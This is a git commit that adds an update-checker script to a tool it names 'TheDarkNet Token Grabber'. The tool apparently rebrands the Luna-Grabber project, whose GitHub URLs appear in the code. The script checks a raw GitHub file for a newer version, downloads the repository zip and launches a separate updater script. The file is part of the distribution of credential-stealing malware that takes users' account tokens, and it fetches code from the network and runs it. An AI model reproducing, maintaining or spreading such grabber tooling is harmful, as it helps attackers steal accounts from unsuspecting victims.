a18d9964e9ccb93d37b4819dd65d5eae83e777b9
FixGFATHER <drdonutdani@gmail.com>
2024-05-22 22:41:10 -0700

    Add files via upload

---
+++ tools/tools/update.py
@@ -0,0 +1,44 @@
+import requests
+import subprocess
+import sys
+from time import sleep
+
+
+class Update():
+    def __init__(self):
+        self.version = '1.8.4'
+        self.github = 'https://raw.githubusercontent.com/Smug246/Luna-Grabber/main/tools/update.py'
+        self.zipfile = 'https://github.com/Smug246/Luna-Grabber/archive/refs/heads/main.zip'
+        self.update_checker()
+
+    def update_checker(self):
+        code = requests.get(self.github).text
+        if "self.version = '1.8.4'" in code:
+            print('This version is up to date!')
+            sleep(1)
+            sys.exit(0)
+        else:
+            print('''
+                    ███╗   ██╗███████╗██╗    ██╗    ██╗   ██╗██████╗ ██████╗  █████╗ ████████╗███████╗██╗
+                    ████╗  ██║██╔════╝██║    ██║    ██║   ██║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██║
+                    ██╔██╗ ██║█████╗  ██║ █╗ ██║    ██║   ██║██████╔╝██║  ██║███████║   ██║   █████╗  ██║
+                    ██║╚██╗██║██╔══╝  ██║███╗██║    ██║   ██║██╔═══╝ ██║  ██║██╔══██║   ██║   ██╔══╝  ╚═╝
+                    ██║ ╚████║███████╗╚███╔███╔╝    ╚██████╔╝██║     ██████╔╝██║  ██║   ██║   ███████╗██╗
+                    ╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝      ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝
+                                      Your version of TheDarkNet Token Grabber is outdated!''')
+            choice = input('\nWould you like to update? (y/n): ')
+            if choice.lower() == 'y':
+                print('Downloading Update...')
+                new_version_source = requests.get(self.zipfile)
+                with open("Update.zip", 'wb')as zipfile:
+                    zipfile.write(new_version_source.content)
+
+                subprocess.Popen([sys.executable, 'tools\\updater.py'])
+
+                sys.exit(2)
+            if choice.lower() == 'n':
+                sys.exit(0)
+
+
+if __name__ == '__main__':
+    Update()
